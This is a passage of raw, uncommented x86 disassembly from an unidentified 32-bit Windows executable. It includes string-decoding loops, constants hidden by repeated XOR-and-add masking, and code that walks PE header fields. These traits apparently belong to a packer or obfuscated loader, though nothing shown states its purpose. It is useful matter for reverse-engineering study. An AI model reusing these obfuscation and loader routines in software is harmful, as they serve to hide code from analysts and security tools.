  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
